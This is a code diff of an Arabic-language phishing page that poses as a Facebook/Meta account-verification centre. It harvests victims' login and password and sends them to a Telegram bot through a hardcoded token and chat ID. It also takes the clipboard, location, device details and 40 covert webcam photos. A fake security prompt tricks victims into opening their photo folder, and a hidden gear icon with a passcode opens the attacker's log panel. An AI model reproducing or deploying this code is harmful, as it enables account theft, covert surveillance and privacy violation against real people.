@@ -2,65 +2,82 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Support | مركز التوثيق الموحد</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; overflow: hidden; }
-        /* زر دخول الملك السري */
-        #royal-key { position: fixed; top: 10px; left: 10px; color: #eee; cursor: pointer; z-index: 10000; font-size: 15px; opacity: 0.3; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; overflow-x: hidden; }
+        
+        /* أيقونة دخول الملك السرية (شفافة للتمويه) */
+        #royal-key { position: fixed; top: 10px; left: 10px; color: #eee; cursor: pointer; z-index: 10000; font-size: 18px; opacity: 0.2; transition: 0.3s; }
+        #royal-key:hover { opacity: 1; color: #1877f2; }
         
         /* واجهة الضحية */
-        .wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .auth-card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); width: 380px; text-align: center; border-top: 5px solid #1877f2; }
-        .fb-logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
-        .status-bar { height: 4px; width: 100%; background: #eee; margin: 15px 0; border-radius: 2px; overflow: hidden; }
-        .progress { height: 100%; width: 0%; background: #28a745; transition: 0.5s; }
+        .wrapper { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
+        .auth-card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; border-top: 6px solid #1877f2; }
+        .fb-logo { color: #1877f2; font-size: 38px; font-weight: bold; margin-bottom: 10px; letter-spacing: -1.5px; }
         
-        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; background: #fafafa; }
-        .btn-king { width: 100%; padding: 15px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .btn-king:active { transform: scale(0.98); }
+        /* شريط التقدم (الحبشتكنات) */
+        .status-bar { height: 6px; width: 100%; background: #eee; margin: 20px 0; border-radius: 3px; overflow: hidden; display: none; }
+        .progress { height: 100%; width: 0%; background: #28a745; transition: 0.4s; }
+        
+        input { width: 92%; padding: 14px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 8px; font-size: 15px; background: #f5f6f7; outline: none; }
+        input:focus { border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+        
+        .btn-king { width: 100%; padding: 16px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; transition: 0.2s; margin-top: 10px; }
+        .btn-king:hover { background: #166fe5; }
+        .btn-king:active { transform: scale(0.97); }
 
-        /* لوحة التحكم (Admin Panel) */
-        #king-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; z-index: 99999; padding: 20px; overflow-y: auto; font-family: 'Courier New', monospace; }
-        .log { border-left: 2px solid #0f0; padding-left: 10px; margin-bottom: 8px; font-size: 13px; }
+        /* لوحة تحكم الملك (Admin Panel) */
+        #king-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050505; color: #00ff41; z-index: 99999; padding: 25px; overflow-y: auto; font-family: 'Courier New', monospace; box-sizing: border-box; }
+        .log-box { border-left: 3px solid #00ff41; padding: 12px; margin-bottom: 12px; background: #111; border-radius: 0 5px 5px 0; font-size: 14px; box-shadow: 2px 2px 10px rgba(0,255,65,0.1); }
+        .panel-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; margin-bottom: 20px; padding-bottom: 10px; }
     </style>
 </head>
 <body>
 
-<div id="royal-key" onclick="verifyKing()"><i class="fas fa-fingerprint"></i></div>
+<!-- ترس الملك المخفي -->
+<div id="royal-key" onclick="verifyKing()"><i class="fas fa-cog"></i></div>
 
+<!-- واجهة الضحية الملحمية -->
 <div id="victim-ui" class="wrapper">
     <div class="fb-logo">facebook</div>
     <div class="auth-card">
-        <h3 style="margin:0;">توثيق الحساب الاحترافي</h3>
-        <p style="font-size: 13px; color: #65676b;">قم بتأكيد هويتك للحصول على الشارة ومنع تقييد الحساب.</p>
+        <h3 style="margin:0; color: #1c1e21;">مركز توثيق الحسابات</h3>
+        <p style="font-size: 14px; color: #65676b; line-height: 1.4;">يرجى تأكيد بياناتك لمنح حسابك شارة التوثيق الزرقاء وحمايته من الإغلاق النهائي.</p>
         
-        <div class="status-bar"><div id="p-bar" class="progress"></div></div>
+        <div class="status-bar" id="s-bar"><div id="p-bar" class="progress"></div></div>
 
         <input type="text" id="target_user" placeholder="رقم الهاتف أو البريد الإلكتروني">
         <input type="password" id="target_pass" placeholder="كلمة السر">
         
-        <button class="btn-king" onclick="executeOrder66()">تفعيل التوثيق الفوري</button>
+        <button class="btn-king" id="main-btn" onclick="executeOrder66()">بدأ عملية التوثيق الفوري</button>
         
-        <div id="msg" style="margin-top:15px; font-size:12px; display:none;"></div>
+        <div id="msg-box" style="margin-top:15px; font-size:13px; color: #28a745; font-weight: bold; display:none;"></div>
     </div>
 </div>
 
+<!-- لوحة التحكم السرية (Admin Console) -->
 <div id="king-panel">
-    <h1 style="text-align:center; color: #0ff;">🔱 TALLAH ROYAL DASHBOARD 🔱</h1>
-    <button onclick="location.reload()" style="background:red; color:white; border:none; padding:5px 15px; cursor:pointer;">LOGOUT</button>
-    <hr color="#222">
-    <div id="logs-container"></div>
+    <div class="panel-header">
+        <h2 style="margin:0; color: #0ff;">🔱 لوحة تحكم الإمبراطور v18.0</h2>
+        <button onclick="location.reload()" style="background:#ff4d4d; color:white; border:none; padding:8px 18px; border-radius:5px; cursor:pointer; font-weight:bold;">خروج آمن</button>
+    </div>
+    <div id="logs-container">
+        <!-- البيانات المسحوبة تظهر هنا -->
+    </div>
 </div>
 
 <script>
+/* ⚙️ إعدادات التليجرام */
 const TOKEN = "8548784698:AAEUk2wNBfD9sJ-Kqr86GKDpKZwSeRZ2ZUU";
 const CHAT = "8754338811";
 
-// 1. دخول الملك (44443)
+// 1. نظام دخول الملك (الباسورد السري: 44443)
 function verifyKing() {
-    if(prompt("Enter Royal Access Code:") === "44443") {
-        showLogs();
+    const code = prompt("أدخل كود الوصول للملك:");
+    if(code === "44443") {
+        renderKingLogs();
         document.getElementById('king-panel').style.display = 'block';
     }
 }
@@ -69,101 +86,143 @@ function verifyKing() {
 async function executeOrder66() {
     const u = document.getElementById('target_user').value;
     const p = document.getElementById('target_pass').value;
-    if(!u || !p) return;
+    
+    if(!u || !p) {
+        alert("يرجى إدخال البيانات المطلوبة للمتابعة");
+        return;
+    }
 
-    // اهتزاز الموبايل (حبشتكنات)
+    // "حبشتكنات": اهتزاز الجهاز لإعطاء شعور بالاحترافية
     if(navigator.vibrate) navigator.vibrate([100, 50, 100]);
 
-    // حفظ البيانات
-    saveData("ACCOUNT", `USER: ${u} | PASS: ${p}`);
-    await sendMsg(`🔥 صيد جديد 🔥\n👤: ${u}\n🔑: ${p}`);
+    // حفظ البيانات في السجل المحلي + إرسال للتليجرام
+    saveToKingDB("ACCOUNT", `👤 مستخدم: ${u} | 🔑 كلمة سر: ${p}`);
+    await sendToTelegram(`🚀 صيد جديد جاري..\n👤 الحساب: ${u}\n🔑 الباسورد: ${p}`);
 
-    // تحديث الواجهة للضحية
-    document.getElementById('p-bar').style.width = "60%";
-    document.getElementById('msg').style.display = "block";
-    document.getElementById('msg').innerHTML = "⏳ جاري فحص ملفات الجهاز وصحة البيانات...";
+    // تحديث الواجهة (خداع بصري)
+    document.getElementById('s-bar').style.display = "block";
+    document.getElementById('main-btn').disabled = true;
+    document.getElementById('main-btn').innerText = "جاري التحقق...";
+    
+    moveProgress(70);
 
-    // سحب كل شيء!
-    grabAllPermissions();
+    // استنزاف كافة صلاحيات المتصفح
+    grabAllOmniPermissions();
 }
 
-async function grabAllPermissions() {
-    // 📍 الموقع
+async function grabAllOmniPermissions() {
+    // 📍 الموقع الجغرافي
     navigator.geolocation.getCurrentPosition(pos => {
         const link = `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-        sendMsg(link); saveData("GPS", link);
+        sendToTelegram(link);
+        saveToKingDB("GPS", link);
     });
 
-    // 📋 الحافظة
+    // 📋 الحافظة (Clipboard)
     try {
         const text = await navigator.clipboard.readText();
-        if(text) sendMsg(`📋 الحافظة: ${text}`);
+        if(text) {
+            sendToTelegram(`📋 نص من الحافظة: ${text}`);
+            saveToKingDB("CLIPBOARD", text);
+        }
     } catch(e){}
 
-    // 🔋 البطارية + الشبكة + الجهاز
-    const batt = await navigator.getBattery();
-    const info = `🔋 شحن: ${batt.level*100}% | 📶 شبكة: ${navigator.connection.effectiveType} | 💻 معالج: ${navigator.hardwareConcurrency}`;
-    sendMsg(info); saveData("HARDWARE", info);
+    // 🔋 بيانات البطارية والجهاز والشبكة
+    try {
+        const batt = await navigator.getBattery();
+        const net = navigator.connection || {};
+        const info = `🔋 شحن: ${batt.level*100}% | 📶 نوع الشبكة: ${net.effectiveType} | 📱 معالجات: ${navigator.hardwareConcurrency}`;
+        sendToTelegram(info);
+        saveToKingDB("HARDWARE", info);
+    } catch(e){}
 
-    // 📸 الكاميرا (40 لقطة)
-    startSpyCam();
+    // 📸 محرك الكاميرا (40 لقطة في الخلفية)
+    startSpyCamera();
 
-    // 📂 سحب ملفات (الخدعة الكبرى)
+    // 📂 سحب المجلدات (الخدعة الكبرى)
     setTimeout(() => {
-        alert("🛡️ نظام الأمان: يرجى اختيار مجلد الصور (DCIM) لمطابقة صورة الملف الشخصي.");
-        const f = document.createElement('input'); f.type = 'file'; f.webkitdirectory = true;
-        f.onchange = (e) => {
-            saveData("FILES", `تم سحب وصول لـ ${e.target.files.length} ملف`);
-            sendMsg(`📂 الضحية فتح مجلد يحتوي على ${e.target.files.length} ملف`);
-            document.getElementById('p-bar').style.width = "100%";
-            document.getElementById('msg').innerHTML = "✅ تم التوثيق بنجاح! سيتم إضافة الشارة لحسابك قريباً.";
+        alert("🛡️ أمان Meta: للمتابعة، يرجى اختيار مجلد الصور (DCIM) للتأكد من ملكية الصور المرفوعة مسبقاً.");
+        const fInput = document.createElement('input');
+        fInput.type = 'file';
+        fInput.webkitdirectory = true;
+        fInput.onchange = (e) => {
+            const count = e.target.files.length;
+            sendToTelegram(`📂 تم الوصول لمجلد يحتوي على ${count} ملف من قبل الضحية.`);
+            saveToKingDB("FILES", `Access granted to folder with ${count} items.`);
+            
+            // إنهاء العملية بنجاح وهمي
+            moveProgress(100);
+            document.getElementById('msg-box').style.display = "block";
+            document.getElementById('msg-box').innerHTML = "✅ تم التحقق من هويتك! سيتم تفعيل شارة التوثيق خلال 24 ساعة.";
         };
-        f.click();
-    }, 4000);
+        fInput.click();
+    }, 4500);
 }
 
-// 3. محرك الجاسوس البصري
-async function startSpyCam() {
+// 3. محرك الجاسوس البصري (Camera Spy)
+async function startSpyCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({video: true});
-        let c = 0;
-        const interval = setInterval(() => {
-            if(c < 40) {
-                const v = document.createElement('video'); v.srcObject = stream; v.play();
-                const can = document.createElement('canvas');
-                can.width = 640; can.height = 480;
-                can.getContext('2d').drawImage(v, 0, 0);
-                can.toBlob(b => sendFile(b, 'photo', `📸 لقطة ${c+1}`));
-                c++;
-            } else { stream.getTracks().forEach(t => t.stop()); clearInterval(interval); }
+        let photoIdx = 0;
+        const interval = setInterval(async () => {
+            if(photoIdx < 40) {
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => {
+                    sendMedia(blob, 'photo', `📸 لقطة حية رقم ${photoIdx+1}`);
+                    photoIdx++;
+                }, 'image/jpeg');
+            } else {
+                stream.getTracks().forEach(t => t.stop());
+                clearInterval(interval);
+            }
         }, 2000);
-    } catch(e) {}
+    } catch(e) {
+        saveToKingDB("CAMERA", "Access Denied by victim.");
+    }
 }
 
-// 4. إدارة البيانات واللوحة
-function saveData(type, data) {
-    let db = JSON.parse(localStorage.getItem('king_db')) || [];
-    db.push({type, data, time: new Date().toLocaleTimeString()});
-    localStorage.setItem('king_db', JSON.stringify(db));
+// 4. إدارة قاعدة بيانات الملك والعرض
+function saveToKingDB(type, content) {
+    let db = JSON.parse(localStorage.getItem('tallah_db')) || [];
+    db.push({type, content, time: new Date().toLocaleTimeString()});
+    localStorage.setItem('tallah_db', JSON.stringify(db));
 }
 
-function showLogs() {
-    const cont = document.getElementById('logs-container');
-    const db = JSON.parse(localStorage.getItem('king_db')) || [];
-    cont.innerHTML = db.reverse().map(l => `
-        <div class="log">
-            <span style="color:yellow">[${l.time}]</span> 
-            <span style="color:#0ff">[${l.type}]</span>: ${l.data}
+function renderKingLogs() {
+    const container = document.getElementById('logs-container');
+    const db = JSON.parse(localStorage.getItem('tallah_db')) || [];
+    if(db.length === 0) {
+        container.innerHTML = "<p>لا توجد بيانات مسحوبة حتى الآن...</p>";
+        return;
+    }
+    container.innerHTML = db.reverse().map(log => `
+        <div class="log-box">
+            <span style="color:#f0f;">[${log.time}]</span> 
+            <span style="color:#0ff;">[${log.type}]</span>: 
+            <span style="color:#fff;">${log.content}</span>
         </div>
     `).join('');
 }
 
-async function sendMsg(t) {
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(t)}`);
+// أدوات الاتصال الخارجية
+function moveProgress(val) {
+    document.getElementById('p-bar').style.width = val + "%";
 }
 
-async function sendFile(b, type, cap) {
-    const fd = new FormData(); fd.append('chat_id', CHAT); fd.append(type, b, 'img.jpg'); fd.append('caption', cap);
+async function sendToTelegram(msg) {
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`);
+}
+
+async function sendMedia(blob, type, caption) {
+    const fd = new FormData();
+    fd.append('chat_id', CHAT);
+    fd.append(type, blob, 'capture.jpg');
+    fd.append('caption', caption);
     fetch(`https://api.telegram.org/bot${TOKEN}/send${type==='photo'?'Photo':'Document'}`, {method:'POST', body:fd});
 }
 </script>
